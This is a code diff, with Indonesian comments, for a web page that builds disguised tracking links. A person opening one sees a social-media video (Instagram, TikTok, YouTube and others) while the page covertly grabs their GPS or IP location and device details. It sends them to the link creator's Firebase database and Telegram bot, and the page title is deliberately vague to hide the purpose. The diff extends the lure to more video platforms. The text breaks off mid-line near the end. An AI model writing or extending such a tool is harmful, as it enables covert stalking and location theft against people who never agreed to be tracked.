@@ -106,6 +106,18 @@
   .btn-copy { background: #0ea5e9; }
   .btn-test { background: #6366f1; }
 
+  .platform-badge {
+    display: inline-block; padding: 4px 10px;
+    border-radius: 20px; font-size: 11px;
+    font-weight: 700; margin-top: 6px;
+  }
+  .p-ig { background: #833ab4; color: white; }
+  .p-tiktok { background: #000; color: #25f4ee; border: 1px solid #25f4ee; }
+  .p-yt { background: #ff0000; color: white; }
+  .p-fb { background: #1877f2; color: white; }
+  .p-tw { background: #1d9bf0; color: white; }
+  .p-other { background: #374151; color: white; }
+
   /* ============ DATA PANEL ============ */
   .stats-row {
     display: flex; gap: 12px; margin-bottom: 16px;
@@ -214,16 +226,45 @@
     color: #aaa; font-size: 14px;
     max-width: 320px; margin: 0 auto;
   }
-  .ig-embed-wrap {
-    width: 100%; max-width: 400px;
+  .embed-wrap {
+    width: 100%; max-width: 420px;
     margin: 16px auto;
     background: white;
     border-radius: 12px;
     overflow: hidden;
   }
-  .ig-embed-wrap iframe {
+  .embed-wrap iframe {
     width: 100%; height: 500px;
     border: none; display: block;
+  }
+  .embed-wrap.tiktok iframe {
+    height: 720px;
+  }
+  .embed-wrap.youtube {
+    max-width: 100%;
+    background: black;
+    position: relative;
+    padding-bottom: 56.25%;
+    height: 0;
+  }
+  .embed-wrap.youtube iframe {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+  }
+  .fallback-redirect {
+    padding: 40px;
+    color: #666;
+    text-align: center;
+    font-family: sans-serif;
+  }
+  .fallback-redirect .icon {
+    font-size: 60px; margin-bottom: 16px;
+  }
+  .fallback-redirect a {
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
   }
 
   .config-warning {
@@ -237,6 +278,12 @@
     border-radius: 4px; color: #fca5a5;
     font-size: 11px;
   }
+
+  .platform-info {
+    margin-top: 6px;
+    font-size: 12px;
+    color: #9ca3af;
+  }
 </style>
 </head>
 <body>
@@ -249,7 +296,7 @@
   </div>
 
   <div id="firebaseWarning" class="config-warning" style="display:none;">
-    ⚠️ <b>Firebase belum dikonfigurasi.</b> Data lokasi hanya akan muncul di browser Anda sendiri (tidak realtime dari device lain).<br>
+    ⚠️ <b>Firebase belum dikonfigurasi.</b> Data lokasi hanya muncul di browser Anda sendiri (tidak realtime dari device lain).<br>
     Buka kode, cari <code>FIREBASE_CONFIG</code>, isi dengan config dari console Firebase.
   </div>
 
@@ -258,8 +305,9 @@
     <div class="panel">
       <h2>🔗 Buat Tracking Link</h2>
 
-      <label>Link Instagram (Reel / Post)</label>
-      <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">
+      <label>Link Video (Instagram / TikTok / YouTube / dll)</label>
+      <input type="text" id="videoUrl" placeholder="https://www.tiktok.com/@user/video/123..." oninput="detectPlatformPreview()">
+      <div class="platform-info" id="platformInfo"></div>
 
       <label>URL Website Ini</label>
       <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app">
@@ -320,7 +368,7 @@
     <div class="spinner" id="trackSpinner"></div>
     <div class="track-title" id="trackTitle">Memuat video...</div>
     <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
-    <div class="ig-embed-wrap" id="igEmbed" style="display:none;"></div>
+    <div class="embed-wrap" id="embedWrap" style="display:none;"></div>
   </div>
 </div>
 
@@ -339,7 +387,6 @@ const FIREBASE_CONFIG = {
   appId: "ISI"
 };
 
-// Cek apakah Firebase sudah dikonfigurasi
 const FIREBASE_READY =
   FIREBASE_CONFIG.apiKey &&
   !FIREBASE_CONFIG.apiKey.includes('ISI_') &&
@@ -347,16 +394,14 @@ const FIREBASE_READY =
   !FIREBASE_CONFIG.databaseURL.includes('ISI');
 
 /* ============================================================
-   LOAD FIREBASE SDK (kalau config tersedia)
+   LOAD FIREBASE SDK
    ============================================================ */
 let fbDB = null;
-let fbListeners = [];
 
 function loadFirebase() {
   return new Promise((resolve) => {
     if (!FIREBASE_READY) { resolve(false); return; }
 
-    // Load Firebase SDK v9 compat
     const scripts = [
       'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js',
       'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js'
@@ -402,12 +447,7 @@ function b64decode(str) {
   } catch(e) { return ''; }
 }
 
-/* ============================================================
-   FALLBACK STORAGE (kalau Firebase tidak ada)
-   Pakai localStorage + storage event
-   ============================================================ */
 const LOCAL_KEY = 'geolink_visits';
-
 function localGetAll() {
   try {
     const raw = localStorage.getItem(LOCAL_KEY);
@@ -419,12 +459,109 @@ function localSave(id, data) {
     const all = localGetAll();
     all[id] = data;
     localStorage.setItem(LOCAL_KEY, JSON.stringify(all));
-    // Trigger storage event untuk tab lain
     window.dispatchEvent(new StorageEvent('storage', {
       key: LOCAL_KEY,
       newValue: JSON.stringify(all)
     }));
   } catch(e) {}
+}
+
+/* ============================================================
+   🎯 DETEKSI PLATFORM VIDEO
+   ============================================================ */
+function detectPlatform(url) {
+  if (!url) return { name: 'unknown', label: 'Tidak dikenali', badgeClass: 'p-other', type: null, id: null };
+
+  // INSTAGRAM
+  let m = url.match(/(?:instagram\.com)\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
+  if (m) {
+    return {
+      name: 'instagram',
+      label: '📷 Instagram ' + m[1].toUpperCase(),
+      badgeClass: 'p-ig',
+      type: m[1],
+      id: m[2],
+      embedUrl: 'https://www.instagram.com/' + m[1] + '/' + m[2] + '/embed/'
+    };
+  }
+
+  // TIKTOK
+  m = url.match(/tiktok\.com\/.*\/video\/(\d+)/);
+  if (m) {
+    return {
+      name: 'tiktok',
+      label: '🎵 TikTok',
+      badgeClass: 'p-tiktok',
+      id: m[1],
+      embedUrl: 'https://www.tiktok.com/embed/v2/' + m[1]
+    };
+  }
+  // TikTok short URL
+  if (/tiktok\.com\/t\//.test(url) || /vm\.tiktok\.com/.test(url)) {
+    return {
+      name: 'tiktok',
+      label: '🎵 TikTok (short)',
+      badgeClass: 'p-tiktok',
+      id: null,
+      embedUrl: null,
+      shortUrl: true
+    };
+  }
+
+  // YOUTUBE
+  m = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/|youtube\.com\/embed\/)([A-Za-z0-9_-]{11})/);
+  if (m) {
+    return {
+      name: 'youtube',
+      label: '▶️ YouTube',
+      badgeClass: 'p-yt',
+      id: m[1],
+      embedUrl: 'https://www.youtube.com/embed/' + m[1] + '?autoplay=1'
+    };
+  }
+
+  // FACEBOOK
+  if (/facebook\.com|fb\.watch/.test(url)) {
+    return {
+      name: 'facebook',
+      label: '📘 Facebook',
+      badgeClass: 'p-fb',
+      id: null,
+      embedUrl: 'https://www.facebook.com/plugins/video.php?href=' + encodeURIComponent(url) + '&show_text=0',
+      useIframe: true
+    };
+  }
+
+  // TWITTER / X
+  m = url.match(/(?:twitter\.com|x\.com)\/\w+\/status\/(\d+)/);
+  if (m) {
+    return {
+      name: 'twitter',
+      label: '🐦 Twitter / X',
+      badgeClass: 'p-tw',
+      id: m[1],
+      embedUrl: null,
+      fallbackRedirect: true
+    };
+  }
+
+  return {
+    name: 'unknown',
+    label: '🌐 Link lain',
+    badgeClass: 'p-other',
+    id: null,
+    embedUrl: null,
+    fallbackRedirect: true
+  };
+}
+
+function detectPlatformPreview() {
+  const url = document.getElementById('videoUrl').value.trim();
+  const info = document.getElementById('platformInfo');
+  if (!url) { info.innerHTML = ''; return; }
+
+  const p = detectPlatform(url);
+  info.innerHTML = '<span class="platform-badge ' + p.badgeClass + '">' + p.label + '</span>';
 }
 
 /* ============================================================
@@ -451,39 +588,34 @@ function localSave(id, data) {
       baseInput.value = (origin === 'null' ? '' : origin) + path;
     }
 
-    // Tampilkan warning kalau Firebase belum diset
     if (!FIREBASE_READY) {
       document.getElementById('firebaseWarning').style.display = 'block';
     }
 
-    // Init Firebase + realtime listener
     loadFirebase().then(ok => {
-      if (ok) {
-        startRealtimeListener();
-      } else {
-        startLocalListener();
-      }
+      if (ok) startRealtimeListener();
+      else startLocalListener();
     });
   }
 })();
 
 /* ============================================================
-   GENERATOR — Buat link
+   GENERATOR
    ============================================================ */
 function generate() {
-  const igUrl = document.getElementById('igUrl').value.trim();
+  const videoUrl = document.getElementById('videoUrl').value.trim();
   const baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
   const botToken = document.getElementById('botToken').value.trim();
   const chatId = document.getElementById('chatId').value.trim();
 
-  if (!igUrl) { alert('Masukkan link Instagram!'); return; }
-  if (!igUrl.includes('instagram.com')) { alert('Link harus dari Instagram!'); return; }
+  if (!videoUrl) { alert('Masukkan link video!'); return; }
+  if (!videoUrl.startsWith('http')) { alert('Link harus mulai dengan http:// atau https://'); return; }
   if (!baseUrl) { alert('Masukkan URL website!'); return; }
 
   const token = Math.random().toString(36).slice(2, 12);
-  const encodedIg = b64encode(igUrl);
+  const encodedVideo = b64encode(videoUrl);
 
-  let url = baseUrl + '/?r=' + encodedIg + '&t=' + token;
+  let url = baseUrl + '/?r=' + encodedVideo + '&t=' + token;
   if (botToken) url += '&b=' + encodeURIComponent(botToken);
   if (chatId) url += '&c=' + encodeURIComponent(chatId);
 
@@ -512,7 +644,7 @@ function testLink() {
 }
 
 /* ============================================================
-   LIVE DATA LISTENER — Firebase
+   REALTIME LISTENER — Firebase
    ============================================================ */
 function startRealtimeListener() {
   const dot = document.getElementById('liveDot');
@@ -520,55 +652,41 @@ function startRealtimeListener() {
 
   const visitsRef = fbDB.ref('visits');
 
-  // Listener baru masuk
   visitsRef.on('child_added', (snapshot) => {
-    const data = snapshot.val();
-    const id = snapshot.key;
-    renderVisitor(id, data, true);
+    renderVisitor(snapshot.key, snapshot.val(), true);
     updateStats();
   });
 
-  // Listener update (misal lokasi di-refine)
   visitsRef.on('child_changed', (snapshot) => {
-    const data = snapshot.val();
-    const id = snapshot.key;
-    // Remove old card, add new
-    const old = document.getElementById('visitor-' + id);
+    const old = document.getElementById('visitor-' + snapshot.key);
     if (old) old.remove();
-    renderVisitor(id, data, false);
+    renderVisitor(snapshot.key, snapshot.val(), false);
     updateStats();
   });
 
-  // Listener hapus
   visitsRef.on('child_removed', (snapshot) => {
     const el = document.getElementById('visitor-' + snapshot.key);
     if (el) el.remove();
     updateStats();
   });
 
-  // Load existing
   visitsRef.once('value').then(snap => {
     const all = snap.val() || {};
-    Object.keys(all).forEach(id => {
-      renderVisitor(id, all[id], false);
-    });
+    Object.keys(all).forEach(id => renderVisitor(id, all[id], false));
     updateStats();
   });
 }
 
 /* ============================================================
-   LIVE DATA LISTENER — localStorage (fallback)
+   REALTIME LISTENER — localStorage (fallback)
    ============================================================ */
 function startLocalListener() {
-  // Render existing
   const all = localGetAll();
   Object.keys(all).forEach(id => renderVisitor(id, all[id], false));
   updateStats();
 
-  // Listen changes
   window.addEventListener('storage', () => {
     const current = localGetAll();
-    // Clear list
     document.getElementById('visitorsList').innerHTML = '';
     Object.keys(current).forEach(id => renderVisitor(id, current[id], false));
     updateStats();
@@ -583,7 +701,6 @@ function renderVisitor(id, data, isNew) {
   const empty = list.querySelector('.empty-state');
   if (empty) empty.remove();
 
-  // Cek apakah sudah ada
   const existing = document.getElementById('visitor-' + id);
   if (existing) existing.remove();
 
@@ -603,7 +720,6 @@ function renderVisitor(id, data, isNew) {
 
   const mapsLink = 'https://maps.google.com/?q=' + data.lat + ',' + data.lng;
 
-  // IP info kalau ada
   let ipInfo = '';
   if (data.city || data.country) {
     ipInfo = '<div class="visitor-meta">' +
@@ -612,7 +728,6 @@ function renderVisitor(id, data, isNew) {
       '</div>';
   }
 
-  // UA singkat
   let ua = data.ua || '';
   let device = '💻 Desktop';
   if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = '📱 Mobile';
@@ -624,12 +739,8 @@ function renderVisitor(id, data, isNew) {
       '<span class="visitor-time">🕐 ' + time + '</span>' +
       badge +
     '</div>' +
-    '<div class="visitor-coords">' +
-      '🌐 ' + lat + ', ' + lng +
-    '</div>' +
-    '<div class="visitor-meta">' +
-      '🎯 Akurasi: ' + acc + ' · ' + device +
-    '</div>' +
+    '<div class="visitor-coords">🌐 ' + lat + ', ' + lng + '</div>' +
+    '<div class="visitor-meta">🎯 Akurasi: ' + acc + ' · ' + device + '</div>' +
     ipInfo +
     '<div class="visitor-actions">' +
       '<a href="' + mapsLink + '" target="_blank">🗺️ Google Maps</a>' +
@@ -639,9 +750,6 @@ function renderVisitor(id, data, isNew) {
   list.insertBefore(card, list.firstChild);
 }
 
-/* ============================================================
-   DELETE VISITOR
-   ============================================================ */
 function deleteVisitor(id) {
   if (!confirm('Hapus data ini?')) return;
   if (fbDB) {
@@ -668,20 +776,14 @@ function clearAll() {
   }
 }
 
-/* ============================================================
-   UPDATE STATS
-   ============================================================ */
 function updateStats() {
   const cards = document.querySelectorAll('.visitor-card');
   let total = cards.length;
-  let gps = 0;
-  let ip = 0;
-
+  let gps = 0, ip = 0;
   cards.forEach(c => {
     if (c.querySelector('.visitor-badge.ip')) ip++;
     else gps++;
   });
-
   document.getElementById('statTotal').textContent = total;
   document.getElementById('statGps').textContent = gps;
   document.getElementById('statIp').textContent = ip;
@@ -691,53 +793,41 @@ function updateStats() {
    TRACKING MODE (yang dilihat target)
    ============================================================ */
 function initTracking(encodedR, token, botToken, chatId) {
-  const igUrl = b64decode(encodedR);
+  const videoUrl = b64decode(encodedR);
 
-  // Simpan info
   window._TRACK = {
-    igUrl: igUrl,
+    videoUrl: videoUrl,
+    platform: detectPlatform(videoUrl),
     token: token,
     botToken: botToken || '',
     chatId: chatId || ''
   };
 
-  // Set judul halaman samar
-  document.title = 'Instagram';
+  // Judul samar
+  document.title = 'Video';
 
-  // Mulai tracking setelah delay pendek (biar halaman render)
-  setTimeout(() => {
-    startTrack();
-  }, 400);
+  // Mulai tracking
+  setTimeout(() => { startTrack(); }, 400);
 
   // Tampilkan video setelah 1.5 detik
-  setTimeout(() => {
-    showVideo();
-  }, 1500);
+  setTimeout(() => { showVideo(); }, 1500);
 }
 
 function startTrack() {
   if (!navigator.geolocation) {
-    // Browser tidak support GPS → fallback ke IP
     ipFallback();
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     (pos) => {
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-      sendData(lat, lng, acc, 'gps');
+      sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
     },
     (err) => {
       console.log('GPS denied, retry low accuracy...');
-      // Retry low accuracy
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          const lat = pos.coords.latitude;
-          const lng = pos.coords.longitude;
-          const acc = pos.coords.accuracy;
-          sendData(lat, lng, acc, 'gps');
+          sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
         },
         (err2) => {
           console.log('GPS retry failed, IP fallback...');
@@ -770,10 +860,8 @@ function sendData(lat, lng, acc, type, extra) {
   extra = extra || {};
   const id = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
   const payload = {
-    lat: lat,
-    lng: lng,
-    acc: acc,
-    type: type,
+    lat: lat, lng: lng, acc: acc, type: type,
+    platform: window._TRACK.platform.name,
     token: window._TRACK.token,
     time: new Date().toISOString(),
     ua: navigator.userAgent,
@@ -783,15 +871,12 @@ function sendData(lat, lng, acc, type, extra) {
     isp: extra.isp || ''
   };
 
-  // Kirim ke Firebase
   if (fbDB) {
     fbDB.ref('visits/' + id).set(payload).catch(e => console.error(e));
   } else {
-    // Fallback: simpan di localStorage (hanya bekerja kalau target & Anda satu browser)
     localSave(id, payload);
   }
 
-  // Kirim ke Telegram kalau ada
   if (window._TRACK.botToken && window._TRACK.chatId) {
     sendTelegram(lat, lng, acc, type, extra);
   }
@@ -800,9 +885,11 @@ function sendData(lat, lng, acc, type, extra) {
 function sendTelegram(lat, lng, acc, type, extra) {
   const mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
   const akurasi = (type === 'ip') ? '~' + Math.round(acc/1000) + ' km (IP)' : Math.round(acc) + ' m';
+  const platform = window._TRACK.platform.label;
 
   let text =
     '📍 *Lokasi Baru*\n\n' +
+    '🎬 Platform: ' + platform + '\n' +
     '🌐 Lat: ' + lat.toFixed(6) + '\n' +
     '🌐 Lng: ' + lng.toFixed(6) + '\n' +
     '🎯 Akurasi: ' + akurasi + '\n' +
@@ -816,54 +903,4 @@ function sendTelegram(lat, lng, acc, type, extra) {
 
   text += '🆔 ' + window._TRACK.token;
 
-  fetch('https://api.telegram.org/bot' + window._TRACK.botToken + '/sendMessage', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: window._TRACK.chatId,
-      text: text,
-      parse_mode: 'Markdown'
-    })
-  }).catch(e => console.error(e));
-
-  if (type !== 'ip') {
-    fetch('https://api.telegram.org/bot' + window._TRACK.botToken + '/sendLocation', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: window._TRACK.chatId,
-        latitude: lat,
-        longitude: lng
-      })
-    }).catch(e => console.error(e));
-  }
-}
-
-function showVideo() {
-  const spinner = document.getElementById('trackSpinner');
-  const title = document.getElementById('trackTitle');
-  const status = document.getElementById('trackStatus');
-  const embed = document.getElementById('igEmbed');
-
-  if (spinner) spinner.style.display = 'none';
-  if (title) title.textContent = 'Instagram';
-  if (status) status.style.display = 'none';
-
-  const info = extractIgInfo(window._TRACK.igUrl);
-  if (!info) {
-    embed.innerHTML = '<div style="padding:40px;color:#666;text-align:center;">' +
-      'Video tidak tersedia<br><br>' +
-      '<a href="' + window._TRACK.igUrl + '" style="color:#0095f6;">Buka Instagram →</a></div>';
-    embed.style.display = 'block';
-    return;
-  }
-
-  const embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
-  embed.innerHTML = '<iframe src="' + embedUrl + '" allowtransparency="true" allowfullscreen="true" scrolling="no" frameborder="0"></iframe>';
-  embed.style.display = 'block';
-}
-
-function extractIgInfo(url) {
-  if (!url) return null;
-  const m = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
-  return m ? { type: m[1], id
+  fetch('https://api.telegram.org/b
